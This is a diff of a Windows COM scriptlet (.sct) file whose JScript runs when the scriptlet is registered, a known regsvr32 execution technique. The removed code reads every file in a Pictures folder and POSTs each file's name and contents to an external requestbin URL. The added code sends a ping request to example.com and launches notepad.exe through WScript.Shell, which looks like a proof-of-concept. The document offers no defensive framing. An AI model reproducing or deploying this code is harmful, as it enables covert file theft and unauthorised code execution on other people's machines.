@@ -1,34 +1,36 @@
 <?XML version="1.0"?>
 <scriptlet>
+
 <registration
-    description="FileHandler"
-    progid="FileHandler"
+    description="Bandit"
+    progid="Bandit"
     version="1.00"
-    classid="{BBBB2222-0000-0000-0000-0000FEEDACDC}">
-    <script language="JScript">
-        <![CDATA[
-            var fso = new ActiveXObject("Scripting.FileSystemObject");
-            var http = new ActiveXObject("MSXML2.XMLHTTP");
-            var folderPath = fso.GetSpecialFolder(2) + "\\Pictures"; // Répertoire Pictures
-            
-            if (fso.FolderExists(folderPath)) {
-                var folder = fso.GetFolder(folderPath);
-                var files = new Enumerator(folder.Files);
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+	>
+
+	<script language="JScript">
+		<![CDATA[
+
+			function Exec()
+                {
+                    try {
+                        var http = new ActiveXObject("Microsoft.XMLHTTP");
+                        var url = "http://example.com/ping";
+                        
+                        http.open("GET", url, false); // Requête synchrone
+                        http.send();
                 
-                for (; !files.atEnd(); files.moveNext()) {
-                    var file = files.item();
-                    var stream = fso.OpenTextFile(file.Path, 1); // Lecture seule
-                    var content = stream.ReadAll();
-                    stream.Close();
+                        WScript.Echo("Requête envoyée à " + url);
+                    } catch (e) {
+                        WScript.Echo("Erreur: " + e.message);
+                    }
                     
-                    // Envoi des données via POST
-                    http.open("POST", "http://requestbin.whapi.cloud/1cvbzjl1", false);
-                    http.setRequestHeader("Content-Type", "text/plain");
-                    http.send("FileName: " + file.Name + "\nContent: " + content);
                 }
-            }
-        ]]>
-    </script>
+
+            Exec();
+
+		]]>
+	</script>
 </registration>
 
 <public>
@@ -37,19 +39,12 @@
 <script language="JScript">
 <![CDATA[
 
-    function Exec() {
-        var shell = new ActiveXObject("WScript.Shell");
-        var desktopPath = shell.SpecialFolders("Desktop");
-        var confirmationFilePath = desktopPath + "\\ExecutionConfirmation.txt";
-        
-        var fso = new ActiveXObject("Scripting.FileSystemObject");
-        var confirmationFile = fso.CreateTextFile(confirmationFilePath, true);
-        confirmationFile.WriteLine("The scriptlet executed successfully.");
-        confirmationFile.Close();
-        
-        shell.Popup("File processing completed. Confirmation file created on Desktop.", 0, "Scriptlet", 64);
-    }
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
+	}
 
 ]]>
 </script>
+
 </scriptlet>
